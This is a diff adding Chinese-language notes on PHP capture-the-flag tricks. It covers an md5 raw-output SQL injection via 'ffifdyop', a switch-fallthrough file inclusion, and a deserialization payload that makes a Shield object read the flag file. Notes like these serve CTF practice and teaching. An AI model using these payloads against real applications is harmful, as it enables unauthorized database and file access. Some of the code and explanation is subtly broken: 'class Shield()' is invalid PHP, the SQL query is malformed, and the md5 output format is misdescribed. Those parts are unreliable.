@@ -473,11 +473,120 @@ echo noother_says_correct($temp);
 ```
 
 
+## md5注入带入’or’
+原理：
+```php
+md5(string,raw)
+raw	可选。规定十六进制或二进制输出格式：
+    TRUE - 原始 16 字符二进制格式
+    FALSE - 默认。32 字符十六进制数
+```
+当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为`'or'<trash>` 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。
+```php
+## 执行顺序:字符串：ffifdyop -> md5()加密成276f722736c95d99e921722cf9ed621c->md5(,true)将16进制转成字符串`'or'<trash>`->sql执行`'or'<trash>`造成注入
+$sql = "SELECT * FROM admin WHERE username = admin pass = '".md5($password,true)."'";
+```
 
+## switch没有break
+```php
+#这里case 0 和 1 没有break,使得程序继续往下执行。
+<?php
+error_reporting(0);
+if (isset($_GET['which']))
+{
+    $which = $_GET['which'];
+    switch ($which)
+    {
+    case 0:
+    case 1:
+    case 2:
+        require_once $which.'.php';
+         echo $flag;
+        break;
+    default:
+        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
+        break;
+    }
+}
+```
 
+## 反序列化
 
+```php
+<!-- index.php -->
+<?php 
+	require_once('shield.php');
+	$x = new Shield();
+	isset($_GET['class']) && $g = $_GET['class'];
+	if (!empty($g)) {
+		$x = unserialize($g);
+	}
+	echo $x->readfile();
+?>
+<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
+<!-- shield.php -->
+<?php
+	//flag is in pctf.php
+	class Shield {
+		public $file;
+		function __construct($filename = '') {
+			$this -> file = $filename;
+		}
+		
+		function readfile() {
+			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
+			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+				return @file_get_contents($this->file);
+			}
+		}
+	}
+?>
+<!-- showimg.php -->
+<?php
+	$f = $_GET['img'];
+	if (!empty($f)) {
+		$f = base64_decode($f);
+		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
+		//stripos — 查找字符串首次出现的位置（不区分大小写）
+		&& stripos($f,'pctf')===FALSE) {
+			readfile($f);
+		} else {
+			echo "File not found!";
+		}
+	}
+?>
+```
 
+```php
+#?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
+<!-- answer.php -->
+<?php
 
+require_once('shield.php');
+$x = class Shield();
+$g = serialize($x);
+echo $g;
+
+?>
+
+<!-- shield.php -->
+<?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = 'pctf.php') {
+            $this -> file = $filename;
+        }
+        
+        function readfile() {
+            if (!empty($this->file) && stripos($this->file,'..')===FALSE  
+            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+                return @file_get_contents($this->file);
+            }
+        }
+    }
+?>
+```
 
 
 
